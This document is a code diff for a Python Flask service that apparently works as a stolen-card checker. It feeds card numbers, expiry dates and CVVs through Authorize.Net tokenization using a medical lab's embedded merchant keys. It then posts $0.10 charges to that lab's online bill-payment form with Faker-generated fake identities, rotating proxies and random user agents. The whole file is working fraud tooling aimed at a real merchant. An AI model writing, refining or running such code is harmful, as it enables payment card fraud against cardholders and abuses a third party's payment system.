@@ -1,152 +1,148 @@
 from flask import Flask, request, jsonify
 import requests
+import json
+import uuid
+from faker import Faker
 from fake_useragent import UserAgent
-import re
 
 app = Flask(__name__)
 
-@app.route("/pay", methods=["GET"])
-def pay():
-    cc = request.args.get("cc")
-    proxy = request.args.get("proxy")
-    amount = request.args.get("amount", "0.10")  # default amount
+# Constants
+MERCHANT_NAME = "3c5Q9QdJW"
+CLIENT_KEY = "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
+DEFAULT_AMOUNT = "0.10"
 
-    if not cc:
-        return jsonify({"error": "Missing cc parameter"}), 400
+fake = Faker()
 
-    parts = cc.split("|")
-    if len(parts) < 3:
-        return jsonify({"error": "Invalid cc format. Use card|MM|YY|CVV or card|MM|YYYY|CVV"}), 400
-
-    card_number = parts[0].strip()
-    month = parts[1].strip()
-    year = parts[2].strip()
-    card_code = parts[3].strip() if len(parts) > 3 else ""
-
-    # Normalize year
-    if len(year) == 4:
-        year = year[-2:]
-    expiration_date = f"{month}{year}"
-
-    # Fake user-agent
+# Fallback for UserAgent
+try:
     ua = UserAgent()
-    user_agent = ua.random
+except Exception as e:
+    print("Using default user agent due to error:", e)
+    ua = UserAgent(fallback="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")
 
-    headers_token = {
+def get_opaque_data(card_number: str, exp_month: str, exp_year: str, card_cvv: str, proxy: dict):
+    url = "https://api2.authorize.net/xml/v1/request.api"
+    headers = {
         "Accept": "*/*",
         "Content-Type": "application/json; charset=UTF-8",
         "Origin": "https://avanticmedicallab.com",
         "Referer": "https://avanticmedicallab.com/",
-        "User-Agent": user_agent
+        "User-Agent": ua.random
     }
-
-    proxies = None
-    if proxy:
-        proxies = {
-            "http": f"http://{proxy}",
-            "https": f"http://{proxy}"
-        }
-
-    try:
-        # Step 1: Get token
-        token_payload = {
-            "securePaymentContainerRequest": {
-                "merchantAuthentication": {
-                    "name": "3c5Q9QdJW",
-                    "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
-                },
-                "data": {
-                    "type": "TOKEN",
-                    "id": "random-id",
-                    "token": {
-                        "cardNumber": card_number,
-                        "expirationDate": expiration_date,
-                        "cardCode": card_code
-                    }
+    payload = {
+        "securePaymentContainerRequest": {
+            "merchantAuthentication": {
+                "name": MERCHANT_NAME,
+                "clientKey": CLIENT_KEY
+            },
+            "data": {
+                "type": "TOKEN",
+                "id": str(uuid.uuid4()),
+                "token": {
+                    "cardNumber": card_number,
+                    "expirationDate": f"{exp_month}{exp_year}",
+                    "cardCode": card_cvv
                 }
             }
         }
+    }
 
-        token_resp = requests.post(
-            "https://api2.authorize.net/xml/v1/request.api",
-            headers=headers_token,
-            json=token_payload,
-            proxies=proxies,
-            timeout=120
-        )
-        token_resp.raise_for_status()
-        token_json = token_resp.json()
-        opaque = token_json.get("opaqueData", {}).get("dataValue")
-        if not opaque:
-            return jsonify({"error": "Unable to fetch token", "raw_response": token_json}), 400
+    r = requests.post(url, headers=headers, json=payload, proxies=proxy, timeout=30)
+    data = json.loads(r.content.decode('utf-8-sig'))
 
-        # Step 2: Submit payment
-        form_data = {
-            "wpforms[fields][1][first]": "John",
-            "wpforms[fields][1][last]": "Doe",
-            "wpforms[fields][17]": amount,
-            "wpforms[fields][2]": "john@example.com",
-            "wpforms[fields][3]": "(999) 999-9999",
-            "wpforms[fields][14]": "Test",
-            "wpforms[fields][4][address1]": "Test Street",
-            "wpforms[fields][4][city]": "Test City",
-            "wpforms[fields][4][state]": "NY",
-            "wpforms[fields][4][postal]": "10001",
-            "wpforms[fields][6]": f"$ {amount}",
-            "wpforms[fields][11][]": "I agree",
-            "wpforms[id]": "4449",
-            "wpforms[author]": "1",
-            "wpforms[post_id]": "3388",
-            "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
-            "wpforms[authorize_net][opaque_data][value]": opaque,
-            "wpforms[authorize_net][card_data][expire]": f"{month}/{year}",
-            "wpforms[token]": "12345",
-            "action": "wpforms_submit",
-            "page_url": "https://avanticmedicallab.com/pay-bill-online/",
-            "page_title": "Pay Bill Online",
-            "page_id": "3388"
-        }
+    if data.get("messages", {}).get("resultCode") == "Ok":
+        return data["opaqueData"]["dataValue"]
+    else:
+        raise Exception(f"Failed to get opaqueData: {data}")
 
-        headers_payment = {
-            "User-Agent": user_agent
-        }
+def submit_payment(opaque_value: str, month: str, year: str, amount: str, proxy: dict):
+    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
+    headers = {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "origin": "https://avanticmedicallab.com",
+        "referer": "https://avanticmedicallab.com/pay-bill-online/",
+        "user-agent": ua.random,
+        "x-requested-with": "XMLHttpRequest"
+    }
 
-        pay_resp = requests.post(
-            "https://avanticmedicallab.com/wp-admin/admin-ajax.php",
-            headers=headers_payment,
-            data=form_data,
-            proxies=proxies,
-            timeout=120
-        )
-        pay_resp.raise_for_status()
-        raw = pay_resp.text
+    # Fake user info
+    first_name = fake.first_name()
+    last_name = fake.last_name()
+    email = fake.email()
+    phone = f"({fake.random_int(200, 999)}) {fake.random_int(200, 999)}-{fake.random_int(1000, 9999)}"
+    city = fake.city()
+    state = "NY"
+    postal = fake.postcode()
+    address = fake.street_address()
 
-        # Extract clean message
-        msg = ""
-        success = False
-        try:
-            json_resp = pay_resp.json()
-            if json_resp.get("success") is True:
-                success = True
-                # strip html tags
-                html = json_resp["data"].get("confirmation", "")
-                msg = re.sub(r"<.*?>", "", html).strip()
-            else:
-                success = False
-                html = json_resp["data"].get("errors", {}).get("general", {}).get("footer", "")
-                msg = re.sub(r"<.*?>", "", html).strip()
-        except Exception:
-            msg = raw
+    form_data = {
+        "wpforms[fields][1][first]": first_name,
+        "wpforms[fields][1][last]": last_name,
+        "wpforms[fields][17]": amount,
+        "wpforms[fields][2]": email,
+        "wpforms[fields][3]": phone,
+        "wpforms[fields][14]": "Test Data",
+        "wpforms[fields][4][address1]": address,
+        "wpforms[fields][4][city]": city,
+        "wpforms[fields][4][state]": state,
+        "wpforms[fields][4][postal]": postal,
+        "wpforms[fields][6]": f"$ {amount}",
+        "wpforms[fields][11][]": "By clicking on Pay Now button you have read and agreed.",
+        "wpforms[id]": "4449",
+        "wpforms[author]": "1",
+        "wpforms[post_id]": "3388",
+        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
+        "wpforms[authorize_net][opaque_data][value]": opaque_value,
+        "wpforms[authorize_net][card_data][expire]": f"{month}/{year}",
+        "wpforms[token]": "1bc9aacc38fe976790deb45fe856da53",
+        "action": "wpforms_submit",
+        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
+        "page_title": "Pay Bill Online",
+        "page_id": "3388"
+    }
+
+    response = requests.post(url, headers=headers, files={k: (None, v) for k, v in form_data.items()}, proxies=proxy, timeout=30)
+    return response.text
+
+@app.route('/submit_payment', methods=['GET'])
+def api_submit_payment():
+    # Extract parameters from the query string
+    card = request.args.get('cc')
+    proxy = {
+        "http": request.args.get('proxy_http'),
+        "https": request.args.get('proxy_https')
+    }
+    amount = request.args.get('amount', DEFAULT_AMOUNT)
+    month = request.args.get('month')
+    year = request.args.get('year')
+    cvv = request.args.get('cvv')
+
+    if not all([card, month, year, cvv]):
+        return jsonify({"error": "Missing required parameters"}), 400
+
+    try:
+        opaque = get_opaque_data(card, month, year, cvv, proxy)
+        raw_response = submit_payment(opaque, month, year, amount, proxy)
+
+        # Clean the response
+        response_data = json.loads(raw_response)
+        success = response_data.get('success', False)
+
+        if success:
+            message = "Your Payment is Successfully Done."
+        else:
+            error_details = response_data.get('data', {}).get('errors', {}).get('general', {}).get('footer', '')
+            message = error_details.replace("<div>", "").replace("</div>", "").strip()
 
         return jsonify({
             "charged_amount": f"${amount}",
-            "message": msg,
-            "success": success,
-            "raw_response": raw
-        })
+            "message": message,
+            "success": success
+        }), 200
 
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        return jsonify({"error": str(e), "success": False}), 400
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    app.run(debug=True)
